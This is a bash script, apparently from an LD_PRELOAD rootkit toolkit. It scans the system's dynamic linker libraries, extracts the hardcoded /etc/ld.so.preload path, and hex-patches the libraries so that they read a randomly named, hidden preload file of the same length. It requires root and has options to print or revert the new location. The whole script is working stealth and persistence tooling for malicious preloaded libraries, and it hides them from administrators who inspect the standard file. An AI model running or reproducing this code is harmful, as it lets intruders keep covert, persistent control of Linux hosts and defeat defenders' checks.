#!/bin/bash

# dirs to scan for dynamic linker libs
declare -a array LIB_DIRS=("/lib/" "/lib/x86_64-linux-gnu/" "/lib/i386-linux-gnu/" "/lib32/" "/libx32/" "/lib64/")

# dirs that our new file location can live in
declare -a array PDIRS=("/bin/" "/sbin/" "/etc/" "/home/" "/lib/" "/libx32/" "/lib64/" "/opt/" "/usr/" "/var/")

declare -a array LD_LIBS=() # later stores paths of dynamic linker libraries to patch

script_root="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
source $script_root/util.sh

get_ld_libs()
{
    #necho "Finding dynamic linker libraries"
    local lib_dir
    for current_dir in ${LIB_DIRS[@]}; do
        [ ! -d $current_dir ] && continue
        lib_dir="${current_dir}*" # /DIRECTORY/*
        for file in ${lib_dir[@]}; do [[ "`basename $file`" == "ld-"*".so"* ]] && LD_LIBS+=($file); done
    done
}

find_preload_location()
{
    local strings_output lib
    [ -z ${LD_LIBS[0]} ] && get_ld_libs
    lib=${LD_LIBS[0]}
    strings_output="$(strings -d $lib | grep '/' | tail -n 1)"
    echo -n $strings_output
}

# builds new location string for the preload file.
get_new_preload(){ echo -n "`$script_root/get_rand_path.sh 2`.`random 'A-Za-z0-9' 8`"; }
hstr(){ local HS="`xxd -p <<< "$1"`"; echo -n "${HS::${#HS}-2}00" | awk '{print toupper($0)}'; }

patch_lib() # $1=target lib, $2=old preload file, $3=new preload file
{
    [[ "`strings $1`" != *"$2"* ]] && return
    [ $2 == $3 ] && { necho "Skipping $1 (nothing to change)"; return; }

    local ho_preload hn_preload
    ho_preload="`hstr $2`" # hex our strings
    hn_preload="`hstr $3`"

    necho "Patching $1"
    hexdump -ve '1/1 "%.2X"' $1 | sed "s/$ho_preload/$hn_preload/g" | xxd -r -p > $1.tmp
    chmod --reference $1 $1.tmp
    mv $1.tmp $1
}

patch_dynamic_linker() # $1=old preload file
{
    local new_preload old_preload
    old_preload=$(find_preload_location)
    [ ! -z "$1" ] && new_preload="$1"
    [ ! -z "$new_preload" ] && [ -f "$new_preload" ] && rm -f "$new_preload"

    while [ -f $new_preload ] || [ -d $new_preload ] || [ -z $new_preload ]; do
        new_preload="`get_new_preload`" # generate new preload file location

        # the new file location has got to be the same length as the previous
        while [ ${#new_preload} -gt ${#old_preload} ]; do new_preload=${new_preload::${#new_preload}-1}; done
        while [ ${#new_preload} -lt ${#old_preload} ]; do new_preload+="`random 'A-Za-z0-9' 1`"; done
    done

    get_ld_libs # get full paths of dl libs and store in array
    for lib in ${LD_LIBS[@]}; do patch_lib $lib $old_preload $new_preload; done
    [ $OUTPUT_PATH == 1 ] && echo -n $new_preload # output the new preload file location
}

USAGE="
  Usage: $0 [ -o | -p | -r | -d ]
         -o:
            Output the new preload file location when finished patching.
            (without a trailing newline)
         -p:
            Fully patch all dynamic linker libs on this system. (REQUIRES ROOT)
         -r:
            Revert the preload file location back to /etc/ld.so.preload. (REQUIRES ROOT) 
         -d:
            Find & output all dynamic linker libraries on this system.
"

OUTPUT_PATH=0
OPTIND=1
while getopts "?oprd" opt; do
    case "$opt" in
    o)
        OUTPUT_PATH=1
        ;;
    p)
        [ $(id -u) != 0 ] && { eecho "Root is required to patch the dynamic linker libs, exiting" && exit; }

        necho "Patching the dynamic linker libraries, please wait"
        patch_dynamic_linker
        exit
        ;;
    r)
        [ $(id -u) != 0 ] && { eecho "Root is required to revert the dynamic linker, exiting" && exit; }

        necho "Reverting the preload file back to default '/etc/ld.so.preload'"
        patch_dynamic_linker /etc/ld.so.preload
        exit
        ;;
    d)
        necho "Getting all lib locations"
        get_ld_libs
        for lib in ${LD_LIBS[@]}; do
            secho "Location: $lib"
            secho "Preload location: $(find_preload_location)"
        done
        exit
        ;;
    ?)
        echo "$USAGE" && exit
    esac
done


[ -z $1 ] && echo "$USAGE"